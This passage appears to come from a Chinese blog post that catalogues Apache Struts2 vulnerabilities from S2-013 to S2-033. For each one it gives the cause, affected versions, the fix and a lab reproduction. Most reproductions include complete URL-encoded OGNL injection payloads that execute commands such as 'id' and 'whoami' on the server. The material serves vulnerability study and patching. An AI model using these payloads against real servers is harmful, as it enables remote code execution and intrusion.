+<h5 id="漏洞检测-13"><a href="#漏洞检测-13" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.20.120:8080/S2-013/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219170241435.png" alt="image-20210219170241435"></p>
+<h5 id="漏洞修复-13"><a href="#漏洞修复-13" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.14.2版本之后已修复</p>
+<h5 id="参考-13"><a href="#参考-13" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-014</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2013-2135"><a href="#CVE-2013-2135" class="headerlink" title="CVE-2013-2135"></a>CVE-2013-2135</h4><p>S2-015</p>
+<h5 id="漏洞描述-14"><a href="#漏洞描述-14" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>漏洞产生是由于Struts.xml中配置了通配符<code>*</code>，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-015&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span>&gt;</span>/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;param&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.ParamAction&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;httpheader&quot;</span>&gt;</span></span><br><span class="line">		  	<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>305<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  				<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;headers.fxxk&quot;</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p>
+<p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 <code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code> 来修改其值达到重获静态方法调用的能力。</p>
+<h5 id="影响范围-14"><a href="#影响范围-14" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.14.2</p>
+<h5 id="漏洞原理-14"><a href="#漏洞原理-14" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>一旦配置通配符<code>*</code>，访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p>
+<h5 id="漏洞条件-14"><a href="#漏洞条件-14" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.14.2</p>
+<h5 id="漏洞检测-14"><a href="#漏洞检测-14" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;S2-015&#x2F;$%7B1+2%7D.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219174824615.png" alt="image-20210219174824615"></p>
+<p>2、payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.20.120:8080/S2-015/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%2C%23q%7D.action</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219174931653.png" alt="image-20210219174931653"></p>
+<h5 id="漏洞修复-14"><a href="#漏洞修复-14" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.14.3版本之后已修复</p>
+<h5 id="参考-14"><a href="#参考-14" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-015</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2013-2251"><a href="#CVE-2013-2251" class="headerlink" title="CVE-2013-2251"></a>CVE-2013-2251</h4><p>S2-016</p>
+<h5 id="漏洞描述-15"><a href="#漏洞描述-15" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><blockquote>
+<p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p>
+</blockquote>
+<h5 id="影响范围-15"><a href="#影响范围-15" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 – Struts 2.3.15</p>
+<h5 id="漏洞原理-15"><a href="#漏洞原理-15" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>struts2中，<code>DefaultActionMapper</code>类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p>
+<h5 id="漏洞条件-15"><a href="#漏洞条件-15" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 – Struts 2.3.15</p>
+<h5 id="漏洞检测-15"><a href="#漏洞检测-15" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;S2-016&#x2F;default.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219180819677.png" alt="image-20210219180819677"></p>
+<p>2、payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.20.120:8080/S2-016/default.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219192239420.png" alt="image-20210219192239420"></p>
+<center>程序路径</center>
+
+<h5 id="漏洞修复-15"><a href="#漏洞修复-15" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.15.1之后版本已修复</p>
+<h5 id="参考-15"><a href="#参考-15" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-016</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2013-2248"><a href="#CVE-2013-2248" class="headerlink" title="CVE-2013-2248"></a>CVE-2013-2248</h4><p>S2-017</p>
+<h5 id="漏洞描述-16"><a href="#漏洞描述-16" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>S2-017和S2-016漏洞产生原因一致，在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p>
+<p>只是两个漏洞PoC不一致。</p>
+<h5 id="影响范围-16"><a href="#影响范围-16" class="headerlink" title="影响范围"></a>影响范围</h5><p> Struts 2.0.0 - Struts 2.3.15</p>
+<h5 id="漏洞原理-16"><a href="#漏洞原理-16" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>2-017和S2-016漏洞产生原因一致，在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p>
+<h5 id="漏洞条件-16"><a href="#漏洞条件-16" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p> Struts 2.0.0 - Struts 2.3.15</p>
+<h5 id="漏洞检测-16"><a href="#漏洞检测-16" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p><code>Win 7</code> + <code>JDK</code> + <code>Tomcat 6.0.9</code> + <code>Struts 2.1.6</code></p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.190:8080&#x2F;struts2-showcase-2.1.6&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219192810470.png" alt="image-20210219192810470"></p>
+<p>3、payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.190:8080&#x2F;struts2-showcase-2.1.6&#x2F;fileupload&#x2F;upload.action?redirect:http:&#x2F;&#x2F;www.yahoo.com&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219192827176.png" alt="image-20210219192827176"></p>
+<center>跳转至雅虎</center>
+
+<h5 id="漏洞修复-16"><a href="#漏洞修复-16" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.15.1版本之后已修复</p>
+<h5 id="参考-16"><a href="#参考-16" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-017</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2013-4310"><a href="#CVE-2013-4310" class="headerlink" title="CVE-2013-4310"></a>CVE-2013-4310</h4><p>S2-018</p>
+<h5 id="漏洞描述-17"><a href="#漏洞描述-17" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>ApacheStruts2.0.0至2.3.15.1版本中存在漏洞。远程攻击者可借助特制的action:prefix利用该漏洞绕过访问控制。</p>
+<h5 id="影响范围-17"><a href="#影响范围-17" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.15.2</p>
+<h5 id="漏洞原理-17"><a href="#漏洞原理-17" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>ApacheStruts2.0.0至2.3.15.1版本中存在漏洞。远程攻击者可借助特制的action:prefix利用该漏洞绕过访问控制。</p>
+<h5 id="漏洞条件-17"><a href="#漏洞条件-17" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.15.2</p>
+<h5 id="漏洞检测-17"><a href="#漏洞检测-17" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>未找到对应复测环境，如有需要还请网络搜索。</p>
+<h5 id="漏洞修复-17"><a href="#漏洞修复-17" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.15.1版本之后已修复</p>
+<h5 id="参考-17"><a href="#参考-17" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-018</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;vul&#x2F;id&#x2F;1166056</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2013-4316"><a href="#CVE-2013-4316" class="headerlink" title="CVE-2013-4316"></a>CVE-2013-4316</h4><p>S2-019</p>
+<h5 id="漏洞描述-18"><a href="#漏洞描述-18" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>当目标服务器<code> &lt;constant name=&quot;struts.devMode&quot; value=&quot;true&quot; /&gt;</code>开启后导致恶意命令执行。</p>
+<p>漏洞和S2-008类似，均是当devMode开启debug模式会出现漏洞。</p>
+<h5 id="影响范围-18"><a href="#影响范围-18" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.15.1</p>
+<h5 id="漏洞原理-18"><a href="#漏洞原理-18" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>当目标服务器<code> &lt;constant name=&quot;struts.devMode&quot; value=&quot;true&quot; /&gt;</code>开启后导致恶意命令执行。</p>
+<p>漏洞和S2-008类似，均是当devMode开启debug模式会出现漏洞。</p>
+<h5 id="漏洞条件-18"><a href="#漏洞条件-18" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.15.1</p>
+<h5 id="漏洞检测-18"><a href="#漏洞检测-18" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p><code>Win 7</code> + <code>JDK</code> + <code>Tomcat 6.0.9</code> + <code>Struts 2.1.6</code></p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.190:8080&#x2F;struts2-showcase-2.1.6&#x2F;showcase.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219202408437.png" alt="image-20210219202408437"></p>
+<p>3、payload(多次请求访问)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.5.190:8080/struts2-showcase-2.1.6/showcase.action?debug=command&amp;expression=%23f%3D%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#x27;whoami&#x27;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210219202255843.png" alt="image-20210219202255843"></p>
+<center>下载主机名文件信息</center>
+
+
+<h5 id="漏洞修复-18"><a href="#漏洞修复-18" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.16.1版本之后已修复</p>
+<h5 id="参考-18"><a href="#参考-18" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-019</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="S2-020"><a href="#S2-020" class="headerlink" title="S2-020"></a>S2-020</h4><h5 id="漏洞描述-19"><a href="#漏洞描述-19" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>将<code>Commons FileUpload</code>版本在1.3.1之下会出现DOS攻击，同时如果未添加’class’排除<code>ParametersInterceptor</code>中的参数（避免使用ClassLoader操作）</p>
+<p>S2-020漏洞博包含两个CVE：CVE-2014-0050 (DoS), CVE-2014-0094 (ClassLoader manipulation)</p>
+<h5 id="影响范围-19"><a href="#影响范围-19" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.16.1</p>
+<h5 id="漏洞原理-19"><a href="#漏洞原理-19" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>将<code>Commons FileUpload</code>版本在1.3.1之下会出现DOS攻击，同时如果未添加’class’排除<code>ParametersInterceptor</code>中的参数（避免使用ClassLoader操作）</p>
+<p>S2-020漏洞博包含两个CVE：CVE-2014-0050 (DoS), CVE-2014-0094 (ClassLoader manipulation)</p>
+<h5 id="漏洞条件-19"><a href="#漏洞条件-19" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.16.1</p>
+<h5 id="漏洞检测-19"><a href="#漏洞检测-19" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>未找到对应复测环境，如有需要还请网络搜索。</p>
+<h5 id="漏洞修复-19"><a href="#漏洞修复-19" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.16.1版本之后已修复</p>
+<h5 id="参考-19"><a href="#参考-19" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-020</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2016-0785"><a href="#CVE-2016-0785" class="headerlink" title="CVE-2016-0785"></a>CVE-2016-0785</h4><p>S2-029</p>
+<h5 id="漏洞描述-20"><a href="#漏洞描述-20" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Struts2的标签库使用OGNL表达式来访问<code>ActionContext</code>中的对象数据。为了能够访问到<code>ActionContext</code>中的变量，Struts2将<code>ActionContext</code>设置为<code>OGNL</code>的上下文，并将<code>OGNL</code>的跟对象加入<code>ActionContext</code>中。<br> 如下的标签就调用了OGNL进行取值。<br> <code>parameters: </code><br>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到<code>parameters</code>对象的msg属性。</p>
+<h5 id="影响范围-20"><a href="#影响范围-20" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</p>
+<h5 id="漏洞原理-20"><a href="#漏洞原理-20" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行。因此需要的条件极为苛刻，特殊的代码，value值为空，可以传参到value，控制name，严格来说应该是个本地漏洞。</p>
+<h5 id="漏洞条件-20"><a href="#漏洞条件-20" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)</p>
+<h5 id="漏洞检测-20"><a href="#漏洞检测-20" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p>docker</p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;S2-029&#x2F;default.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210220110436911.png" alt="image-20210220110436911"></p>
+<p>3、payload测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.20.120:8080/S2-029/default.action?message=(%23_memberAccess[&#x27;allowPrivateAccess&#x27;]=true,%23_memberAccess[&#x27;allowProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;excludedPackageNamePatterns&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;excludedClasses&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;allowPackageProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream()))</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210220110604705.png" alt="image-20210220110604705"></p>
+<center>执行如上命令成功</center>
+
+<h5 id="漏洞修复-20"><a href="#漏洞修复-20" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.3.20.3之后版本已修复</p>
+<h5 id="参考-20"><a href="#参考-20" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-029</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2016-3081"><a href="#CVE-2016-3081" class="headerlink" title="CVE-2016-3081"></a>CVE-2016-3081</h4><p>S2-032</p>
+<h5 id="漏洞描述-21"><a href="#漏洞描述-21" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。<br> <code>method:&lt;name&gt; Action </code>前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会执行。</p>
+<h5 id="影响范围-21"><a href="#影响范围-21" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
+<h5 id="漏洞原理-21"><a href="#漏洞原理-21" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。<br> <code>method:&lt;name&gt; Action </code>前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会执行。</p>
+<h5 id="漏洞条件-21"><a href="#漏洞条件-21" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
+<h5 id="漏洞检测-21"><a href="#漏洞检测-21" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p><code>Win 7</code> + <code>JDK</code> + <code>Tomcat 6.0.9</code> + <code>Struts 2.3.24</code></p>
+<p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/struts/2.3.24/">Struts 2.3.24</a>下载apps的zip包即可</p>
+<p>2、struts.xml添加如下代码(Struts 2.3.24默认开启)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constantname=“struts.enable.DynamicMethodInvocation”</span> <span class="attr">value</span>=<span class="string">“true”/</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210220171347809.png" alt="image-20210220171347809"></p>
+<p>3、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.5.194:8080&#x2F;struts2-showcase&#x2F;index.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210220171323863.png" alt="image-20210220171323863"></p>
+<p>4、payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.5.194:8080/struts2-showcase/home.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=whoami</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210220171303435.png" alt="image-20210220171303435"></p>
+<h5 id="漏洞修复-21"><a href="#漏洞修复-21" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.5版本之后均已修复</p>
+<h5 id="参考-21"><a href="#参考-21" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-032</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2016-3087"><a href="#CVE-2016-3087" class="headerlink" title="CVE-2016-3087"></a>CVE-2016-3087</h4><p>S2-033</p>
+<h5 id="漏洞描述-22"><a href="#漏洞描述-22" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行。</p>
+<h5 id="影响范围-22"><a href="#影响范围-22" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
+<h5 id="漏洞原理-22"><a href="#漏洞原理-22" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行。</p>
+<h5 id="漏洞条件-22"><a href="#漏洞条件-22" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
+<h5 id="漏洞检测-22"><a href="#漏洞检测-22" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;S2-033&#x2F;orders</span><br></pre></td></tr></table></figure>
+
